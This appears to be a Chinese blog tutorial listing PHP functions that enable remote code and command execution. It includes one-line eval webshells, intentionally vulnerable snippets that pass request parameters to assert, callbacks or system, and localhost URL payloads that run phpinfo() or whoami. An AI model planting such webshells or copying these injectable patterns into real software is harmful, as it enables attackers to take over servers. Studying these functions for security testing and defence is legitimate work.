---
title: RCE常见函数
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: RCE
categories: RCE
---

# php代码/命令执行漏洞常见危险函数

### php代码执行相关

> 参考[php手册](https://www.php.net/manual/zh/index.php)

- eval()

  - 说明
    
    ```php
    eval(string $code):mixed
    ```
    
  - 将字符串`$code`作为php代码执行。常见的一句话木马：

    ```php
    <?php @eval($_POST['cmd']);?>
    <?php @eval($_GET['cmd']);?>
    <?php @eval($_REQUEST['cmd']);?>
    ```

  - 所有的语句必须以分号结尾

  - 可以用合适的PHP tag来离开、重新进入PHP模式

    ```php
    'echo "In PHP mode!"; ?>In HTML mode!<?php echo "Back in PHP mode!";'
    ```

- assert()

  - php5

    ```php
    assert( mixed $assertion[, string $description] ) : bool
    ```

  - php7

    ```php
    assert( mixed $assertion[, Throwable $exception] ) : bool
    ```

  - ```php
    <?php assert($_GET['pass']);?>
    ```

    ```
    http://localhost/demo.php?pass=phpinfo()
    ```

    phpinfo()后可以不用分号。得到phpinfo()页面。

- preg_replace

  - ```php
    preg_replace( 
        mixed $pattern, 
        mixed $replacement, 
        mixed $subject
        [, int $limit = -1
         [, int &$count]] 
    ) : mixed
    ```
    
  - 搜索 `subject` 中匹配 `pattern` 的部分，以     `replacement` 进行替换。当使用被启用的e修饰符时，这个函数会转义一些字符（即：‘、”、\和NULL）然后进行后向引用替换。在完成替换后，引擎会将结果字符串作为PHP代码**使用eval方式进行评估**并将返回值作为最终参与替换的字符串

- call_user_func()

  - ```php
    call_user_func( 
        callable $callback
        [, mixed $parameter
         [, mixed $...]] 
    ) : mixed
    ```
    
  - 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。传入call_user_func()的参数不能为引用传递。

  - ```php
    <?php call_user_func($_GET['a'],$_GET['b']);?>
    ```

    访问

    ```
    http://localhost/demo.php?a=assert&b=phpinfo()
    ```

- call_user_func_array()

  - ```php
    call_user_func_array( 
        callable $callback, 
        array $param_arr
    ) : mixed
    ```
    
  - 把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。

  - ```php
    <?php
    	call_user_func_array($_GET[a],$_GET['b']);
    ?>
    ```

    访问

    ```
    http://localhost/demo.php?a=assert&b[]=phpinfo()
    ```

- create_function

  - ```php
    create_function(
        string $args,
        string $code
    ) : string
    ```
    
  - 该函数的内部实现用到了`eval`，所以也具有相同的安全问题。第一个参数`args`是后面定义函数的参数，第二个参数是函数的代码。

  - ```php
    <?php
    	$a=$_GET['kk'];
    	$b=create_function('$a',"echo $a");
    	$b('');
    ?>
    ```

    访问

    ```
    http://localhost/demo.php?kk=phpinfo();
    ```

- array_map()

  - ```php
    array_map( 
        callable $callback, 
        array $array1
        [, array $...] 
    ) : array
    ```
    
  - 作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。
  
  - ```php
    <?php
    	$array=array(0,1,2,3,4,5);
    	array_map($_GET['kk'],$array);
    ?>
    ```
  
    访问

    ```
    http://localhost/demo.php?kk=phpinfo
    ```
  
    注意没有`()`和分号`;`

## 系统命令执行相关

- system()

  - ```php
    system( 
        string $command
        [, int &$return_var] 
    ) : string
    ```
    
  - command是要执行的命令。return_var，如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。

  - ```php
    <?php			
    	system("whoami");
    ?>
    ```

- passthru()

  - ```php
    passthru( 
        string $command
        [, int &$return_var] 
    ) : void
    ```
    
  - 同 `exec() `函数类似，**`passthru()`** 函数也是用来执行外部命令（`command`）的。当所执行的 Unix 命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代`exec()`或 `system()`函数。

  - ```php
    <?php
    	passthru("whoami");
    ?>
    ```

- exec()

  - ```php
    exec( 
        string $command
        [, array &$output
         [, int &$return_var]] 
    ) : string
    ```
    
  - **exec()** 执行`command`参数所指定的命令。

  - ```php
    <?php
    	echo exec("whoami");
    ?>
    ```

- pcntl_exec()

  - ```php
    pcntl_exec( 
        string $path
        [, array $args
         [, array $envs]] 
    ) : void
    ```
    
  - `path`是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本。

    `args`是一个要传递给程序的参数的字符串数组。

  - ```php
    <?php
    	pcntl_exec("/bin/bash",array("whoami"));
    ?>
    ```

- shell_exec()

  - ```php
    shell_exec( string $cmd ) : string
    ```

  - cmd是要执行的命令

  - ```php
    <?php
    	echo shell_exec("whoami");
    ?>
    ```

- popen()

  - ```php
    popen( 
        string $command, 
        string $mode
    ) : resource
    ```
    
  - 打开一个指向进程的管道，该进程由派生给定的 `command` 命令执行而产生。后面的`mode`，当为'r'时，返回的文件指针等于命令的STDOUT，当为‘w’时,返回的文件指针等于命令的STDIN。

  - ```php
    <?php
    	$handle=popen("/bin/ls","r");
    ?>
    ```

- proc_open()

  - 
    
    ```php
    proc_open( 
        string $cmd, 
        array $descriptorspec, 
        array &$pipes
        [,string $cwd = NULL
         [, array $env = NULL
          [, array $other_options = NULL]]] 
    ) : resource
    ```
    
  - 类似 [popen()](mk:@MSITStore:C:\Users\10429\Desktop\php_enhanced_zh.chm::/res/function.popen.html) 函数，但是 **proc_open()** 提供了更加强大的控制程序执行的能力。

- **`**(反引号)

  - 在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数shell_exec()相同）。

  - 
    
    ```php
    <?php
    	echo `whoami`;
    ?>
    ```

- ob_start()

  - 
    
    ```php
    ob_start(
        [ callback $output_callback
         [, int $chunk_size
          [, bool $erase]]] 
    ) : bool
    ```
    
  - 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。
  
    可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被(  ob_flush(), ob_clean()  或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用  output_callback 时，它将收到输出缓冲区的内容作为参数  并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。
  
    下面的代码，由于调用了ob_end_flush()，所以会调用ob_start(*c**m**d*)中的*c**m**d*，把我们输入的_GET[a]作为cmd的参数。
  
  - ```php
    <?php
    	$cmd='system';
    	ob_start($cmd);
    	echo "$_GET['a']";
    	ob_end_flush();
    ?>
    ```

    访问
  
    ```
    http://localhost/demo.php?a=whoami
    ```
  
- php mail()

  ```php
  mail( 
  	string $to, 
  	string $subject, 
  	string $message
  	[, string $additional_headers
  	[, string $additional_parameters]] 
  ) : bool
  ```

  要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项

  - 配置SMTP服务器的主机名和端口
  - 配置PHP用作邮件传输代理(MTA)的文件路径

  当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。

